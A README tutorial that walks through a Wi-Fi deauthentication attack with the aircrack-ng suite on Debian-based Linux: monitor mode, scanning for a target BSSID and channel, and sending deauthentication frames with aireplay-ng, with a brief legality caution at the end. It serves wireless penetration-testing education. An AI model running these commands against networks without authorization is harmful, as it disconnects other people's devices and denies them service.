# Deauthentication Attack using `aircrack-ng` suite on Linux

Here's a basic README for performing a deauthentication attack using `aircrack-ng` suite in Ubuntu/Debian-based system (may be identical on other system):

---

## Prerequisites

- Wireless network card that support monitor mode and packet injection (e.g., Atheros AR9565)
- `aircrack-ng` suite installed, if not
  
  ```bash
  sudo apt install aircrack-ng
  ```

## Steps

1. **Open Terminal**: Press `Ctrl + Alt + T` to open the terminal.

2. **Check Wireless Interface**: Determine the name of your wireless network interface. Use the following command:
   
    ```bash
    iwconfig
    ```
    Identify your wireless interface (e.g., wlan0, wlp3s0).

3. **Put your Wireless Interface in Monitor Mode**: Use `airmon-ng` to put your wireless interface in monitor mode. Replace `wlan0` with your wireless interface name:
   
    ```bash
    sudo airmon-ng start wlan0
    ```
    This command usually rename your interface (e.g., `wlan0mon` `wlp3s0mon`).

4. **Check Monitor Interface**: Verify that the monitor mode has been enabled by running:

   ```bash
   iwconfig
   ```
   You should see your interface listed in monitor mode (e.g., `wlan0mon` `wlp3s0mon`).

5. **Scan for Networks**: Use `airodump-ng` to scan for nearby wireless networks and find the target's BSSID (MAC address) and channel:

   ```bash
   sudo airodump-ng wlan0mon
   ```
   This will scan nearby wireless networks on all channel. Use `Ctrl+C` to stop scanning.

6. **Scan for Target Nerworks**: After knowing which channel the target are, use `--channel` and re-scan. 
   
   ```bash
   sudo airodump-ng wlan0mon --channel 1
   ```
   Replace `1` with your target's channel.

7. **Execute Deauthentication Attack**: Open a new terminal window or tab and execute the deauthentication attack using the following command:

   ```bash
   sudo aireplay-ng -0 5 -a <BSSID> wlan0mon
   ```
   Replace `<BSSID>` with the BSSID of the target network obtained from the previous step.

   `-0` flag specifies the deauthentication attack.
   
   `5` represents the number of deauthentication packets to send. Adjust as needed. `0` means unlimited.

8. **Monitor Activity**: Switch back to the first terminal where `airodump-ng` is running. You should see devices disconnecting and attempting to reconnect to the target network.

9. **Exit Monitor Mode**: Once you've completed the attack, exit monitor mode using:

   ```bash
   sudo airmon-ng stop wlan0mon
   ```
   Replace `wlan0mon` with your monitor interface name if different.

## Notes
- **Caution**: Deauthentication attacks can be illegal if performed without proper authorization. Ensure you have permission before conducting such tests.
- Use responsibly and in controlled environments.
- Be mindful of the laws and regulations related to wireless network security in your area.
